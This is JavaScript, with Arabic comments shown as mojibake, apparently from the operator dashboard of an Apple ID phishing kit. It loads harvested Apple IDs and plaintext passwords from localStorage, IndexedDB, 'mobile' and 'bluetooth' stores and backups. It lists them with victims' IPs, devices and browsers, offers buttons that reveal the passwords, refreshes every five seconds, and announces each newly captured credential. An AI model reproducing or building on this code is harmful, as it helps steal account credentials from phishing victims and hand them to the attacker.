                showNotification('Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª', 'error');
            }
        }
        
        // ØªØ­Ù…ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„
        async function loadCredentials() {
            try {
                const sources = [];
                
                // 1. localStorage
                const localCreds = JSON.parse(localStorage.getItem('apple_credentials') || '[]');
                sources.push(...localCreds);
                
                // 2. ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù‡ÙˆØ§ØªÙ
                const mobileCreds = JSON.parse(localStorage.getItem('mobile_credentials') || '[]');
                sources.push(...mobileCreds);
                
                // 3. IndexedDB
                if (window.indexedDB) {
                    const dbCreds = await getFromIndexedDB('credentials');
                    sources.push(...dbCreds);
                }
                
                // 4. Ù†Ø¸Ø§Ù… Ø§Ù„Ø¨Ù„Ø¹Ø©
                const bluetoothCreds = JSON.parse(localStorage.getItem('bluetooth_data') || '[]')
                    .filter(item => item.type === 'credential')
                    .map(item => item.data);
                sources.push(...bluetoothCreds);
                
                // 5. Ù…Ù„ÙØ§Øª Ø§Ù„Ù†Ø³Ø® Ø§Ù„Ø§Ø­ØªÙŠØ§Ø·ÙŠ
                const backupCreds = await loadFromBackups();
                sources.push(...backupCreds);
                
                // Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                allCredentials = processData(sources);
                
                // Ø¹Ø±Ø¶ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                displayCredentials();
                
                console.log(`âœ… ØªÙ… ØªØ­Ù…ÙŠÙ„ ${allCredentials.length} Ø¨ÙŠØ§Ù†Ø§Øª Ø¯Ø®ÙˆÙ„`);
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„:', error);
                allCredentials = [];
            }
        }
        
        // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª
        async function loadVisits() {
            try {
                const sources = [];
                
                // 1. localStorage
                const localVisits = JSON.parse(localStorage.getItem('apple_visits') || '[]');
                sources.push(...localVisits);
                
                // 2. ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù‡ÙˆØ§ØªÙ
                const mobileVisits = JSON.parse(localStorage.getItem('mobile_visits') || '[]');
                sources.push(...mobileVisits);
                
                // 3. IndexedDB
                if (window.indexedDB) {
                    const dbVisits = await getFromIndexedDB('visits');
                    sources.push(...dbVisits);
                }
                
                // Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                allVisits = processData(sources);
                
                // Ø¹Ø±Ø¶ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                displayVisits();
                
                console.log(`âœ… ØªÙ… ØªØ­Ù…ÙŠÙ„ ${allVisits.length} Ø²ÙŠØ§Ø±Ø©`);
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª:', error);
                allVisits = [];
            }
        }
        
        // ØªØ­Ù…ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‡ÙˆØ§ØªÙ
        async function loadMobileData() {
            try {
                const sources = [];
                
                // Ø¬Ù…Ø¹ Ù…Ù† Ø¬Ù…ÙŠØ¹ Ù…ØµØ§Ø¯Ø± Ø§Ù„Ù‡ÙˆØ§ØªÙ
                const mobileSources = [
                    'mobile_credentials',
                    'mobile_visits',
                    'mobile_dashboard_update',
                    'bluetooth_cache',
                    'bluetooth_data'
                ];
                
                for (const source of mobileSources) {
                    const data = JSON.parse(localStorage.getItem(source) || '[]');
                    if (Array.isArray(data)) {
                        sources.push(...data);
                    }
                }
                
                // Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                mobileData = processData(sources);
                
                // Ø¹Ø±Ø¶ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                displayMobileData();
                
                console.log(`âœ… ØªÙ… ØªØ­Ù…ÙŠÙ„ ${mobileData.length} Ø¨ÙŠØ§Ù†Ø§Øª Ù‡Ø§ØªÙ`);
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‡ÙˆØ§ØªÙ:', error);
                mobileData = [];
            }
        }
        
        // ØªØ­Ù…ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ù„ÙˆØªÙˆØ«
        async function loadBluetoothData() {
            try {
                const sources = [];
                
                // Ø¬Ù…Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ù„ÙˆØªÙˆØ«
                const bluetoothSources = [
                    'bluetooth_data',
                    'bluetooth_cache',
                    'sqlite_backup_'
                ];
                
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    if (bluetoothSources.some(source => key.includes(source))) {
                        try {
                            const data = JSON.parse(localStorage.getItem(key));
                            if (data && data.type === 'bluetooth_transfer') {
                                sources.push(data);
                            }
                        } catch (e) {
                            // ØªØ¬Ø§Ù‡Ù„ Ø§Ù„Ù…ÙØ§ØªÙŠØ­ ØºÙŠØ± Ø§Ù„ØµØ§Ù„Ø­Ø©
                        }
                    }
                }
                
                // Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                bluetoothData = processData(sources);
                
                // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª
                updateBluetoothStats();
                
                console.log(`âœ… ØªÙ… ØªØ­Ù…ÙŠÙ„ ${bluetoothData.length} Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ù„ÙˆØªÙˆØ«`);
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ù„ÙˆØªÙˆØ«:', error);
                bluetoothData = [];
            }
        }
        
        // Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        function processData(dataArray) {
            try {
                // Ø¥Ø²Ø§Ù„Ø© Ø§Ù„ØªÙƒØ±Ø§Ø±Ø§Øª
                const unique = Array.from(new Map(dataArray.map(item => {
                    const key = item.timestamp + JSON.stringify(item.data || item);
                    return [key, item];
                })).values());
                
                // ÙØ±Ø² Ø­Ø³Ø¨ Ø§Ù„ØªØ§Ø±ÙŠØ® (Ø§Ù„Ø£Ø­Ø¯Ø« Ø£ÙˆÙ„Ø§Ù‹)
                return unique.sort((a, b) => {
                    const timeA = new Date(a.timestamp || a.time || a.saved_at);
                    const timeB = new Date(b.timestamp || b.time || b.saved_at);
                    return timeB - timeA;
                });
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª:', error);
                return [];
            }
        }
        
        // Ø§Ù„Ø­ØµÙˆÙ„ Ù…Ù† IndexedDB
        async function getFromIndexedDB(storeName) {
            return new Promise((resolve) => {
                try {
                    if (!window.indexedDB) {
                        resolve([]);
                        return;
                    }
                    
                    const request = indexedDB.open('AppleDataDB', 1);
                    
                    request.onsuccess = function(event) {
                        const db = event.target.result;
                        const transaction = db.transaction([storeName], 'readonly');
                        const store = transaction.objectStore(storeName);
                        const getAllRequest = store.getAll();
                        
                        getAllRequest.onsuccess = function() {
                            resolve(getAllRequest.result || []);
                        };
                        
                        getAllRequest.onerror = function() {
                            resolve([]);
                        };
                    };
                    
                    request.onerror = function() {
                        resolve([]);
                    };
                    
                } catch (error) {
                    console.warn('âš ï¸ Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø§Ù„Ù‚Ø±Ø§Ø¡Ø© Ù…Ù† IndexedDB:', error);
                    resolve([]);
                }
            });
        }
        
        // ØªØ­Ù…ÙŠÙ„ Ù…Ù† Ø§Ù„Ù†Ø³Ø® Ø§Ù„Ø§Ø­ØªÙŠØ§Ø·ÙŠØ©
        async function loadFromBackups() {
            const backups = [];
            
            try {
                // Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ù…Ù„ÙØ§Øª Ø§Ù„Ù†Ø³Ø® Ø§Ù„Ø§Ø­ØªÙŠØ§Ø·ÙŠ
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    if (key.includes('_backup_') || key.includes('_mobile_')) {
                        try {
                            const data = JSON.parse(localStorage.getItem(key));
                            if (data && Array.isArray(data)) {
                                backups.push(...data);
                            }
                        } catch (e) {
                            // ØªØ¬Ø§Ù‡Ù„ Ø§Ù„Ù…ÙØ§ØªÙŠØ­ ØºÙŠØ± Ø§Ù„ØµØ§Ù„Ø­Ø©
                        }
                    }
                }
            } catch (error) {
                console.warn('âš ï¸ Ù„Ø§ ÙŠÙ…ÙƒÙ† ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù†Ø³Ø® Ø§Ù„Ø§Ø­ØªÙŠØ§Ø·ÙŠØ©:', error);
            }
            
            return backups;
        }
        
        // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª
        function updateStats() {
            const stats = {
                totalCredentials: allCredentials.length,
                totalVisits: allVisits.length,
                mobileCredentials: allCredentials.filter(c => c.deviceType === 'mobile' || c.isMobile).length,
                desktopCredentials: allCredentials.filter(c => c.deviceType === 'desktop' || !c.isMobile).length,
                todayCredentials: allCredentials.filter(c => {
                    const credDate = new Date(c.timestamp || c.time);
                    const today = new Date();
                    return credDate.toDateString() === today.toDateString();
                }).length,
                uniqueIPs: [...new Set(allCredentials.map(c => c.ip).filter(ip => ip && ip !== 'unknown'))].length
            };
            
            document.getElementById('statsContainer').innerHTML = `
                <div class="stat-card">
                    <div class="stat-icon">ğŸ”</div>
                    <div class="stat-number">${stats.totalCredentials}</div>
                    <div class="stat-label">Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„</div>
                    <div style="font-size: 12px; margin-top: 5px;">
                        <span style="color: var(--success);">${stats.mobileCredentials} Ù‡Ø§ØªÙ</span> | 
                        <span style="color: var(--primary);">${stats.desktopCredentials} ÙƒÙ…Ø¨ÙŠÙˆØªØ±</span>
                    </div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon">ğŸ‘€</div>
                    <div class="stat-number">${stats.totalVisits}</div>
                    <div class="stat-label">Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª</div>
                    <div style="font-size: 12px; margin-top: 5px;">
                        <span style="color: var(--success);">${stats.todayCredentials} Ø§Ù„ÙŠÙˆÙ…</span>
                    </div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon">ğŸŒ</div>
                    <div class="stat-number">${stats.uniqueIPs}</div>
                    <div class="stat-label">Ø¹Ù†Ø§ÙˆÙŠÙ† IP Ù…Ø®ØªÙ„ÙØ©</div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon">ğŸ“±</div>
                    <div class="stat-number">${stats.mobileCredentials}</div>
                    <div class="stat-label">Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù† Ø§Ù„Ù‡ÙˆØ§ØªÙ</div>
                    <div style="font-size: 12px; margin-top: 5px;">
                        <span style="color: var(--success);">${Math.round((stats.mobileCredentials / Math.max(stats.totalCredentials, 1)) * 100)}%</span>
                    </div>
                </div>
            `;
        }
        
        // Ø¹Ø±Ø¶ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„
        function displayCredentials() {
            const tbody = document.getElementById('credentialsBody');
            const emptyState = document.getElementById('emptyCredentials');
            
            if (allCredentials.length === 0) {
                tbody.innerHTML = '';
                emptyState.style.display = 'block';
                return;
            }
            
            emptyState.style.display = 'none';
            
            let html = '';
            allCredentials.forEach((cred, index) => {
                const time = new Date(cred.timestamp || cred.time).toLocaleString('ar-SA');
                const isMobile = cred.deviceType === 'mobile' || cred.isMobile;
                const browser = getBrowserName(cred.userAgent);
                
                html += `
                <tr>
                    <td>${index + 1}</td>
                    <td>${time}</td>
                    <td><strong>${cred.appleId || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</strong></td>
                    <td class="password-cell">
                        <span class="password-hidden">â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢</span>
                        <button class="toggle-password" onclick="togglePassword(${index})">
                            ğŸ‘ï¸ Ø¹Ø±Ø¶
                        </button>
                        <div class="password-visible" id="passwordView${index}">
                            ${cred.password || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
                        </div>
                    </td>
                    <td>${cred.ip || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</td>
                    <td>
                        <span class="device-badge ${isMobile ? 'device-mobile' : 'device-desktop'}">
                            ${isMobile ? 'ğŸ“± Ù‡Ø§ØªÙ' : 'ğŸ’» ÙƒÙ…Ø¨ÙŠÙˆØªØ±'}
                        </span>
                    </td>
                    <td>${browser}</td>
                    <td>
                        <button class="btn btn-danger" style="padding: 5px 10px; font-size: 12px;" 
                                onclick="deleteCredential(${index})">
                            Ø­Ø°Ù
                        </button>
                    </td>
                </tr>
                `;
            });
            
            tbody.innerHTML = html;
        }
        
        // Ø¹Ø±Ø¶ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª
        function displayVisits() {
            const tbody = document.getElementById('visitsBody');
            const emptyState = document.getElementById('emptyVisits');
            
            if (allVisits.length === 0) {
                tbody.innerHTML = '';
                emptyState.style.display = 'block';
                return;
            }
            
            emptyState.style.display = 'none';
            
            let html = '';
            allVisits.forEach((visit, index) => {
                const time = new Date(visit.timestamp || visit.time).toLocaleString('ar-SA');
                const isMobile = visit.isMobile || /mobile/i.test(visit.userAgent || '');
                const browser = getBrowserName(visit.userAgent);
                const screen = visit.screen || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
                const language = visit.language || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
                const referrer = visit.referrer === 'direct' ? 'Ù…Ø¨Ø§Ø´Ø±' : (visit.referrer || 'Ù…Ø¨Ø§Ø´Ø±');
                
                html += `
                <tr>
                    <td>${index + 1}</td>
                    <td>${time}</td>
                    <td>${visit.ip || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</td>
                    <td>
                        <span class="device-badge ${isMobile ? 'device-mobile' : 'device-desktop'}">
                            ${isMobile ? 'ğŸ“± Ù‡Ø§ØªÙ' : 'ğŸ’» ÙƒÙ…Ø¨ÙŠÙˆØªØ±'}
                        </span>
                    </td>
                    <td>${browser}</td>
                    <td>${screen}</td>
                    <td>${language}</td>
                    <td>${referrer}</td>
                </tr>
                `;
            });
            
            tbody.innerHTML = html;
        }
        
        // Ø¹Ø±Ø¶ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‡ÙˆØ§ØªÙ
        function displayMobileData() {
            const tbody = document.getElementById('mobileBody');
            const emptyState = document.getElementById('emptyMobile');
            
            if (mobileData.length === 0) {
                tbody.innerHTML = '';
                emptyState.style.display = 'block';
                return;
            }
            
            emptyState.style.display = 'none';
            
            let html = '';
            mobileData.forEach((data, index) => {
                const time = new Date(data.timestamp || data.saved_at || data.time).toLocaleString('ar-SA');
                const type = data.type || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
                const appleId = data.appleId || data.data?.appleId || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
                const password = data.password || data.data?.password || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
                const platform = data.platform || data.data?.platform || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
                const storageMethods = data.storage_method || data.method || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
                const status = data.success !== false ? 'âœ…' : 'âŒ';
                
                html += `
                <tr>
                    <td>${index + 1}</td>
                    <td>${time}</td>
                    <td>${type}</td>
                    <td>${appleId}</td>
                    <td class="password-cell">
                        <span class="password-hidden">â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢</span>
                        <button class="toggle-password" onclick="toggleMobilePassword(${index})">
                            ğŸ‘ï¸ Ø¹Ø±Ø¶
                        </button>
                        <div class="password-visible" id="mobilePasswordView${index}">
                            ${password}
                        </div>
                    </td>
                    <td>${platform}</td>
                    <td>${storageMethods}</td>
                    <td>${status}</td>
                </tr>
                `;
            });
            
            tbody.innerHTML = html;
        }
        
        // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ø³Ù… Ø§Ù„Ù…ØªØµÙØ­
        function getBrowserName(userAgent) {
            if (!userAgent) return 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
            
            const ua = userAgent.toLowerCase();
            if (ua.includes('chrome')) return 'Chrome';
            if (ua.includes('firefox')) return 'Firefox';
            if (ua.includes('safari')) return 'Safari';
            if (ua.includes('edge')) return 'Edge';
            if (ua.includes('opera')) return 'Opera';
            return 'Ù…ØªØµÙØ­ Ø¢Ø®Ø±';
        }
        
        // ØªØ¨Ø¯ÙŠÙ„ Ø¹Ø±Ø¶ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±
        function togglePassword(index) {
            const view = document.getElementById(`passwordView${index}`);
            const btn = event.target;
            
            if (view.style.display === 'block') {
                view.style.display = 'none';
                btn.textContent = 'ğŸ‘ï¸ Ø¹Ø±Ø¶';
            } else {
                view.style.display = 'block';
                btn.textContent = 'ğŸ™ˆ Ø¥Ø®ÙØ§Ø¡';
            }
        }
        
        // ØªØ¨Ø¯ÙŠÙ„ Ø¹Ø±Ø¶ ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ± Ø§Ù„Ù‡ÙˆØ§ØªÙ
        function toggleMobilePassword(index) {
            const view = document.getElementById(`mobilePasswordView${index}`);
            const btn = event.target;
            
            if (view.style.display === 'block') {
                view.style.display = 'none';
                btn.textContent = 'ğŸ‘ï¸ Ø¹Ø±Ø¶';
            } else {
                view.style.display = 'block';
                btn.textContent = 'ğŸ™ˆ Ø¥Ø®ÙØ§Ø¡';
            }
        }
        
        // Ø­Ø°Ù Ø¨ÙŠØ§Ù†Ø§Øª Ø¯Ø®ÙˆÙ„
        function deleteCredential(index) {
            if (confirm('Ù‡Ù„ ØªØ±ÙŠØ¯ Ø­Ø°Ù Ù‡Ø°Ù‡ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§ØªØŸ')) {
                allCredentials.splice(index, 1);
                saveCredentials();
                displayCredentials();
                updateStats();
                showNotification('ØªÙ… Ø­Ø°Ù Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ù†Ø¬Ø§Ø­', 'success');
            }
        }
        
        // Ø­ÙØ¸ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„
        function saveCredentials() {
            try {
                localStorage.setItem('apple_credentials', JSON.stringify(allCredentials));
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø­ÙØ¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª:', error);
            }
        }
        
        // ØªØ¨Ø¯ÙŠÙ„ Ø§Ù„ØªØ¨ÙˆÙŠØ¨
        function switchTab(tabName) {
            // Ø¥Ø®ÙØ§Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„ØªØ¨ÙˆÙŠØ¨Ø§Øª
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„ØªØ¨ÙˆÙŠØ¨ Ø§Ù„Ù…Ø­Ø¯Ø¯
            const tabId = `tab${tabName.charAt(0).toUpperCase() + tabName.slice(1)}`;
            document.getElementById(tabId).classList.add('active');
            
            // ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªØ¨ÙˆÙŠØ¨ Ø§Ù„Ù†Ø´Ø·
            document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`).classList.add('active');
            
            currentTab = tabName;
            
            // ØªØ­Ù…ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ¨ÙˆÙŠØ¨ Ø¥Ø°Ø§ Ù„Ø²Ù… Ø§Ù„Ø£Ù…Ø±
            if (tabName === 'mobile') {
                loadMobileData();
            } else if (tabName === 'bluetooth') {
                loadBluetoothData();
            }
        }
        
        // ÙÙ„ØªØ±Ø© Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„
        function filterCredentials(searchTerm) {
            const rows = document.querySelectorAll('#credentialsBody tr');
            const term = searchTerm.toLowerCase();
            
            rows.forEach(row => {
                const text = row.textContent.toLowerCase();
                row.style.display = text.includes(term) ? '' : 'none';
            });
        }
        
        // ÙÙ„ØªØ±Ø© Ø­Ø³Ø¨ Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø²
        function filterByDevice(deviceType) {
            const rows = document.querySelectorAll('#credentialsBody tr');
            
            rows.forEach(row => {
                const deviceCell = row.cells[4];
                if (!deviceCell) return;
                
                const deviceText = deviceCell.textContent.toLowerCase();
                const isMobile = deviceText.includes('Ù‡Ø§ØªÙ');
                
                if (!deviceType || 
                    (deviceType === 'mobile' && isMobile) ||
                    (deviceType === 'desktop' && !isMobile)) {
                    row.style.display = '';
                } else {
                    row.style.display = 'none';
                }
            });
        }
        
        // ÙÙ„ØªØ±Ø© Ø­Ø³Ø¨ Ø§Ù„ØªØ§Ø±ÙŠØ®
        function filterByDate(timeRange) {
            const rows = document.querySelectorAll('#credentialsBody tr');
            const now = new Date();
            
            rows.forEach(row => {
                const timeCell = row.cells[1];
                if (!timeCell) return;
                
                const timeText = timeCell.textContent;
                const rowDate = parseArabicDate(timeText);
                
                let show = true;
                
                if (timeRange === 'today') {
                    show = rowDate.toDateString() === now.toDateString();
                } else if (timeRange === 'week') {
                    const weekAgo = new Date(now - 7 * 24 * 60 * 60 * 1000);
                    show = rowDate >= weekAgo;
                } else if (timeRange === 'month') {
                    const monthAgo = new Date(now);
                    monthAgo.setMonth(monthAgo.getMonth() - 1);
                    show = rowDate >= monthAgo;
                }
                
                row.style.display = show ? '' : 'none';
            });
        }
        
        // ØªØ­ÙˆÙŠÙ„ Ø§Ù„ØªØ§Ø±ÙŠØ® Ø§Ù„Ø¹Ø±Ø¨ÙŠ
        function parseArabicDate(dateString) {
            try {
                // Ø¥Ø²Ø§Ù„Ø© Ø§Ù„Ù†ØµÙˆØµ Ø§Ù„Ø¹Ø±Ø¨ÙŠØ©
                const cleaned = dateString.replace(/[Ù -Ù©]/g, d => 'Ù Ù¡Ù¢Ù£Ù¤Ù¥Ù¦Ù§Ù¨Ù©'.indexOf(d))
                                         .replace(/[Û°-Û¹]/g, d => 'Û°Û±Û²Û³Û´ÛµÛ¶Û·Û¸Û¹'.indexOf(d));
                return new Date(cleaned);
            } catch {
                return new Date();
            }
        }
        
        // ÙÙ„ØªØ±Ø© Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª
        function filterVisits(searchTerm) {
            const rows = document.querySelectorAll('#visitsBody tr');
            const term = searchTerm.toLowerCase();
            
            rows.forEach(row => {
                const text = row.textContent.toLowerCase();
                row.style.display = text.includes(term) ? '' : 'none';
            });
        }
        
        // ÙÙ„ØªØ±Ø© Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‡ÙˆØ§ØªÙ
        function filterMobileData(searchTerm) {
            const rows = document.querySelectorAll('#mobileBody tr');
            const term = searchTerm.toLowerCase();
            
            rows.forEach(row => {
                const text = row.textContent.toLowerCase();
                row.style.display = text.includes(term) ? '' : 'none';
            });
        }
        
        // Ø¨Ø¯Ø¡ Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ
        function startAutoRefresh() {
            if (refreshInterval) {
                clearInterval(refreshInterval);
            }
            
            refreshInterval = setInterval(() => {
                if (currentTab === 'credentials' || currentTab === 'mobile') {
                    loadCredentials();
                    loadMobileData();
                }
                updateStats();
                updateConnectionStatus();
            }, 5000); // ØªØ­Ø¯ÙŠØ« ÙƒÙ„ 5 Ø«ÙˆØ§Ù†ÙŠ
        }
        
        // Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ø§Ø³ØªÙ…Ø§Ø¹ Ù„Ù„ØªØ­Ø¯ÙŠØ«Ø§Øª Ø§Ù„Ù…Ø¨Ø§Ø´Ø±Ø©
        function setupRealTimeListeners() {
            // Ø§Ù„Ø§Ø³ØªÙ…Ø§Ø¹ Ù„Ù„Ø±Ø³Ø§Ø¦Ù„
            window.addEventListener('message', function(event) {
                if (event.data && event.data.type === 'mobile_update') {
                    handleMobileUpdate(event.data);
                }
                
                if (event.data && event.data.type === 'new_credential') {
                    handleNewCredential(event.data);
                }
            });
            
            // Ø§Ù„Ø§Ø³ØªÙ…Ø§Ø¹ Ù„Ù„ØªØ­Ø¯ÙŠØ«Ø§Øª Ù…Ù† localStorage
            window.addEventListener('storage', function(event) {
                if (event.key === 'mobile_dashboard_update') {
                    try {
                        const update = JSON.parse(event.newValue);
                        handleMobileUpdate(update);
                    } catch (e) {
                        console.warn('âš ï¸ Ø®Ø·Ø£ ÙÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© ØªØ­Ø¯ÙŠØ« localStorage');
                    }
                }
                
                if (event.key === 'dashboard_live_update') {
                    try {
                        const update = JSON.parse(event.newValue);
                        handleNewCredential(update);
                    } catch (e) {
                        console.warn('âš ï¸ Ø®Ø·Ø£ ÙÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© ØªØ­Ø¯ÙŠØ« Ù…Ø¨Ø§Ø´Ø±');
                    }
                }
            });
            
            // Ø§Ù„Ø§Ø³ØªÙ…Ø§Ø¹ Ù„Ù„Ø£Ø­Ø¯Ø§Ø« Ø§Ù„Ù…Ø®ØµØµØ©
            window.addEventListener('dashboardUpdate', function(event) {
                if (event.detail && event.detail.type === 'new_credential') {
                    handleNewCredential(event.detail);
                }
            });
        }
        
        // Ù…Ø¹Ø§Ù„Ø¬Ø© ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù‡ÙˆØ§ØªÙ
        function handleMobileUpdate(update) {
            if (update.data) {
                // Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©
                allCredentials.unshift(update.data);
                mobileData.unshift(update);
                
                // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¹Ø±Ø¶
                if (currentTab === 'credentials') {
                    displayCredentials();
                } else if (currentTab === 'mobile') {
                    displayMobileData();
                }
                
                // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª
                updateStats();
                
                // Ø¥Ø¸Ù‡Ø§Ø± Ø¥Ø´Ø¹Ø§Ø±
                showNotification(`ØªÙ… Ø§Ø³ØªÙ‚Ø¨Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø¬Ø¯ÙŠØ¯Ø© Ù…Ù† ${update.device === 'mobile' ? 'Ù‡Ø§ØªÙ' : 'ÙƒÙ…Ø¨ÙŠÙˆØªØ±'}`, 'success');
            }
        }
        
        // Ù…Ø¹Ø§Ù„Ø¬Ø© Ø¨ÙŠØ§Ù†Ø§Øª Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯Ø©
        function handleNewCredential(data) {
            if (data.data) {
                // Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©
                allCredentials.unshift(data.data);
                
                // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¹Ø±Ø¶
                if (currentTab === 'credentials') {
                    displayCredentials();
                }
                
                // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª
                updateStats();
                
                // Ø¥Ø¸Ù‡Ø§Ø± Ø¥Ø´Ø¹Ø§Ø±
                showNotification(`ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯Ø©: ${data.data.appleId}`, 'success');
            }
        }
        
        // ØªØ­Ø¯ÙŠØ« Ø­Ø§Ù„Ø© Ø§Ù„Ø§ØªØµØ§Ù„
        function updateConnectionStatus() {
            const statusElement = document.getElementById('connectionStatus');
            if (statusElement) {
                const isConnected = allCredentials.length > 0;
                statusElement.textContent = isConnected ? 'Ù…ØªØµÙ„Ø©' : 'Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„...';
                statusElement.style.color = isConnected ? 'white' : '#FF9500';
            }
        }
        
